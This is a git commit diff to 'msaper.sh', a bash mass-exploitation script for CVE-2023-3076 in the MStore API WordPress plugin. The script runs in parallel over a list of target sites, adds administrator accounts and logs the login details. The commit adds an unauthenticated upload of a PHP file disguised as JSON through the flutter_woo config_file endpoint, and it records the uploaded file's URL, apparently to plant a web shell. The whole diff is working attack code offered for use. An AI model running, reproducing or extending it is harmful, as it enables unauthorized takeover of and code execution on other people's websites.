7666f052097db3714818249e35a0e13c5de4ea32
Hanzou Urushihara <61415393+im-hanzou@users.noreply.github.com>
2023-09-20 18:38:10 +0700

    Update msaper.sh

--- msaper.sh
+++ msaper.sh
@@ -1,5 +1,5 @@
 #!/bin/bash
-# MStore API < 3.9.9 - Unauthenticated Privilege Escalation
+# MStore API < 3.9.9 - Unauthenticated Privilege Escalation + PHP File Upload
 # Created By Im-Hanzou
 # Using GNU Parallel
 # Usage Linux or WSL: 'bash msaper.sh list.txt thread'
@@ -19,11 +19,11 @@ EOF
 )
 
 printf "${cyan}$banner${classic}\n"
-printf "${yellow}CVE-2023-3076 Mass Add Admin${classic}\n\n"
+printf "${yellow}CVE-2023-3076 Mass Add Admin + PHP File Upload${classic}\n\n"
 printf "Created By ${yellow}Im-Hanzou${classic}\n"
 printf "Github: ${yellow}im-hanzou${classic}\n\n"
 
-touch vuln.txt notvuln.txt results.txt
+touch vuln.txt notvuln.txt results.txt uploaded.txt
 
 exploit() {
     red='\033[1;31m'
@@ -50,8 +50,11 @@ exploit() {
                 echo -e "Site: $target/wp-login.php\nEmail: ${email}\nUsername: ${username}\nPassword: ${password}\n\n" >> results.txt
             elif [[ $xploit =~ "${username}" ]]; then
                 printf "${green}[ Already Added ]${classic} => $target\n";
+            elif [[ $(curl -s --connect-timeout 10 --max-time 10 --insecure -X POST "$target/wp-json/api/flutter_woo/config_file" --compressed -F 'file=@config.tifa.json.php;type=application/json') =~ 'config.tifa.json.php' ]]; then
+                printf "${green}[ Vuln! Uploaded ]${classic} => [ $target ]\n";
+                echo "$target/wp-content/uploads/2000/01/config.tifa.json.php" >> uploaded.txt
             else
-                printf "${red}[ Not Vuln / Already Added ]${classic} => $target\n";
+                printf "${red}[ Not Vuln ]${classic} => $target\n";
                 echo "$target" >> notvuln.txt
             fi
         else
